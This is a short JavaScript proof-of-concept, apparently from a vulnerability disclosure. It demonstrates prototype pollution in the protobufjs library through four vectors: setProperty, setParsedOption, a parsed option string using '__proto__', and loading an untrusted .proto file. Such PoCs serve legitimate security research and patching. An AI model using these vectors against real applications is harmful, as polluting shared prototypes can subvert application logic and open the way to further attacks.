// index.js
protobuf = require("protobufjs");

// Object.freeze(Object.prototype);

let person1 = {firstName:"John", lastName:"Doe", age:50, eyeColor:"blue"};
let person2 = {firstCoolName:"John", lastName:"Doe", age:50, eyeColor:"blue"};

// Vector 1
let evilkey = "__proto__.firstName"
let evilval = "evilvalue"
protobuf.util.setProperty(person1, evilkey, evilval); 

// Vector 2
let obj = new protobuf.ReflectionObject("Test")
obj.setParsedOption({}, evilval, evilkey);


// Vector 3
let p = `option (foo).__proto__.someprop= "somevalue";`
protobuf.parse(p)
// Vector 4
protobuf.load("/path/to/untrusted.proto", function(err, root) { return });
console.log({}.firstName);
console.log(person1.firstName);
console.log(person2.firstName); 
